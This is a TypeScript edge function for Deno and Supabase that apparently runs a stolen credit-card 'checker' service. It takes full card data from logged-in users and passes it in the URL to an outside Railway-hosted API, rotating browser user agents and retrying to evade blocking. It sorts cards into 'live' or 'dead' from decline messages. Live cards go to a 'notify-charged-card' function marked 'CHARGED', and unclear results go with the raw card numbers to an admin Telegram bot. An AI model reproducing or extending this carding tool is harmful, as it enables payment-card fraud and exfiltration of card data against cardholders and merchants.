import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[ADYEN-AUTH] notify-charged-card error:", err));
};

const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
  const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
  if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;

  const message = `🔍 <b>Adyen Auth Debug</b>\n\n` +
    `<b>Card:</b> <code>${cardDetails}</code>\n` +
    `<b>Status:</b> UNKNOWN\n\n` +
    `<b>Raw API Response:</b>\n<pre>${rawResponse.substring(0, 3000)}</pre>`;

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: ADMIN_TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    }),
  }).catch((err) => console.error("[ADYEN-AUTH] admin debug error:", err));
};

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const success = data?.success;
  const message = (data?.message as string)?.toLowerCase() || '';
  const status = (data?.status as string)?.toUpperCase() || '';

  if (success === true) return "live";
  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE') return "live";

  if (success === false) return "dead";
  if (status === 'ERROR' || status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') return "dead";
  if (message.includes("declined") || message.includes("insufficient") || message.includes("invalid") ||
      message.includes("expired") || message.includes("do not honor") || message.includes("incorrect") ||
      message.includes("error") || message.includes("failed")) return "dead";

  return "unknown";
};

const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  const apiUrl = `https://ayden-production.up.railway.app/cc=${cc}`;

  console.log(`[ADYEN-AUTH] Attempt ${attempt}/${maxRetries} - Calling API`);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });

    const rawText = await response.text();
    console.log(`[ADYEN-AUTH] Attempt ${attempt} - Raw response:`, rawText);

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
    }

    const computedStatus = getStatusFromResponse(data);
    const apiMessage = data.message || 'No response message';

    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[ADYEN-AUTH] UNKNOWN on attempt ${attempt}, retrying...`);
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      return performCheck(cc, getRandomUserAgent(), attempt + 1);
    }

    return {
      computedStatus,
      apiStatus: data.status || 'UNKNOWN',
      apiMessage,
      rawResponse: rawText,
    };
  } catch (error) {
    console.error(`[ADYEN-AUTH] Attempt ${attempt} error:`, error);

    if (attempt < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      return performCheck(cc, getRandomUserAgent(), attempt + 1);
    }

    const errMsg = error instanceof Error ? error.message : "Unknown fetch error";
    return { apiStatus: "ERROR", apiMessage: errMsg, computedStatus: "unknown" };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { cc } = await req.json();

    if (!cc) {
      return new Response(JSON.stringify({
        error: 'Card data (cc) is required',
        computedStatus: 'unknown', apiStatus: 'ERROR', apiMessage: 'Card data (cc) is required'
      }), { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    console.log('[ADYEN-AUTH] Checking card for user:', user.id);

    const data = await performCheck(cc, getRandomUserAgent());

    if (data.computedStatus === 'live') {
      notifyChargedCard(user.id, cc, 'CHARGED', String(data.apiMessage || 'LIVE'), '$0.00', 'Adyen Auth');
    }

    if (data.computedStatus === 'unknown') {
      sendAdminDebug(cc, String(data.rawResponse || ''));
    }

    return new Response(JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[ADYEN-AUTH] Error:', errorMessage);
    return new Response(JSON.stringify({
      error: errorMessage, status: "ERROR", computedStatus: "unknown", apiStatus: "ERROR", apiMessage: errorMessage
    }), { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
